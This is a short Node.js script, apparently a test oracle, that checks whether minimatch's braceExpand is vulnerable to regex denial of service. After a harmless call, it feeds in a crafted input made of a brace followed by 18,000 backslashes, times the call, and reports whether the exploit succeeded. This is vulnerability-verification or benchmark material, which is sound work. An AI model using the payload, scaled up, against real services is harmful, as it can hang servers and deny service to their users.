const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: verify public API works normally.
  const benign = minimatch.braceExpand('a{b,c}d');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'abd' || benign[1] !== 'acd') {
    throw new Error('benign braceExpand produced unexpected result');
  }

  operation_completed = true;

  // Malicious input for ReDoS in braceExpand path.
  // Keep size bounded so vulnerable versions still finish quickly.
  const n = 18000;
  const malicious = '{' + '\\'.repeat(n);

  const t0 = Date.now();
  try {
    minimatch.braceExpand(malicious);
    const elapsed = Date.now() - t0;
    // Vulnerable behavior: very slow processing (catastrophic backtracking).
    // Patched behavior should return quickly due to safer brace detection.
    exploit_succeeded = elapsed > 1200;
    evidence = 'malicious_call_elapsed_ms=' + elapsed + ';threshold_ms=1200;input_backslashes=' + n;
  } catch (err) {
    // If malicious call throws after benign success, treat as blocked.
    exploit_succeeded = false;
    evidence = 'malicious_call_threw=' + (err && err.name ? err.name : 'Error');
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failed=' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed,
  exploit_succeeded,
  evidence
}));
